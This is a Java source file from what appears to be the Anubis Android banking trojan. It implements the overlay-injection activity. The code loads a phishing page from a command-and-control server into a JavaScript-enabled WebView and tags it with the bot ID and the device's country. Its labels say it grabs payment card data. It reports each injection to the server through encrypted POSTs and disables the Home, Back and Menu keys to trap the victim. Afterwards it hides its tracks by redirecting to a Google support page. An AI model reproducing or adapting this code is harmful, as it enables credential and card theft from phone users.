package anubis.bot.myapplication.Activity;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Intent;
import android.content.res.Resources;
import android.os.Bundle;
import android.util.Base64;
import android.view.KeyEvent;
import android.view.View;
import android.webkit.JsResult;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.R;
import anubis.bot.myapplication.UtilsClass;
import anubis.bot.myapplication.Constants;

public class ActivityInjection extends Activity {
    Constants const_ = new Constants();
    UtilsClass SF = new UtilsClass();

    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }


    @SuppressLint("SetJavaScriptEnabled")
    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
       // setContentView(R.layout.activity_main);
    }

    @Override
    protected void onStart() {
        super.onStart();
        SF.SetWrite(this,"name","true");
        Intent intent = getIntent();
        String str = intent.getStringExtra("str");
        if(!str.equals("")||!str.equals(null)) {

            String url=const_.urlInj;
            try{
                url = SF.SetRead(this,"urlInj");
            }catch (Exception ex){}



            WebView wv = new WebView(this);
            wv.getSettings().setJavaScriptEnabled(true);
            wv.setScrollBarStyle(View.SCROLLBARS_INSIDE_OVERLAY);
            wv.setWebViewClient(new ActivityInjection.MyWebViewClient());
            wv.setWebChromeClient(new ActivityInjection.MyWebChromeClient());
            String locate = Resources.getSystem().getConfiguration().locale.getCountry();
            wv.loadUrl(url + "/fafa.php?f=" + str + "&p=" + SF.ID_B(this) + "|" + locate.toLowerCase());
            setContentView(wv);
           // WebView wv = (WebView) findViewById(R.id.webView);
           // wv.getSettings().setJavaScriptEnabled(true);
          //  wv.setScrollBarStyle(View.SCROLLBARS_INSIDE_OVERLAY);
           // wv.setWebViewClient(new MyWebViewClient());
            //wv.setWebChromeClient(new MyWebChromeClient());
         //   wv.loadUrl( url + "/" + str + ".php?p=" + SF.ID_B(this) + "|" + locate.toLowerCase());
            if (str.equals("grab3")) {
                str = "Info + Grabber cards mini";
            }
            if (str.equals("grab1")) {
                str = "Info + Grabber cards";
            }
            if (str.equals("grab4")) {
                str = "Grabber cards mini";
            }
            if (str.equals("grab2")) {
                str = "Grabber cards";
            }

            SF.POST(this,"4", "p=" + SF.trafEnCr(SF.ID_B(this) + "|Start injection " + str + "|"));
        }
    }

    private class MyWebViewClient extends WebViewClient {
        @Override
        public void onPageFinished (WebView view, String url){
            SF.Log("Start Activity Inject", url);
            if((url.contains("a10.php"))&&((!url.contains("STOP")))){
                SF.SetWrite(ActivityInjection.this, "save_inj", "");
                SF.SetWrite(ActivityInjection.this, "lock_inj", "");
                SF.SetWrite(ActivityInjection.this, "timeStartGrabber", "");
                SF.SetWrite(ActivityInjection.this,"name","false");
                view.loadUrl("https://support.google.com/calendar/answer/6261951?hl=en&co=GENIE.Platform=Android");
            }

            if(url.contains("STOP")){
                view.loadUrl("https://support.google.com/calendar/answer/6261951?hl=en&co=GENIE.Platform=Android");
                //stopService(new Intent(ActivityOpenURL.this, ServiceInjections.class));
                finish();
             //   exit(0);
            }
            if(url.contains("exitdagjhadfjedgjsfhexitlgdgsfhafg")){
                view.loadUrl("https://support.google.com/calendar/answer/6261951?hl=en&co=GENIE.Platform=Android");
                finish();
               // exit(0);
            }

            if(url.contains("|Grabber card step 3|")) {
                SF.SetWrite(ActivityInjection.this, "save_inj", "");
                SF.SetWrite(ActivityInjection.this, "lock_inj", "");
                SF.SetWrite(ActivityInjection.this, "timeStartGrabber", "");
                SF.SetWrite(ActivityInjection.this,"name","false");
            }
        }
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {

            return false;
        }
    }

    private class MyWebChromeClient extends WebChromeClient {

        @Override
        public boolean onJsAlert(WebView view, String url, String message, JsResult result) {

            return true;
        }
    }

    @Override
    protected void onStop() {
        super.onStop();
        SF.SetWrite(this,"name","false");
    }
    @Override
    public void onDestroy(){
        super.onDestroy();
        SF.SetWrite(this,"name","false");
    }
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_HOME) {
            return true;
        }
        if (keyCode == KeyEvent.KEYCODE_BACK) {
            return true;
        }
        if (keyCode == KeyEvent.KEYCODE_MENU) {
            return true;
        }
        return false;
    }
    @Override
    public void onBackPressed() {
        super.onBackPressed();
    }
}
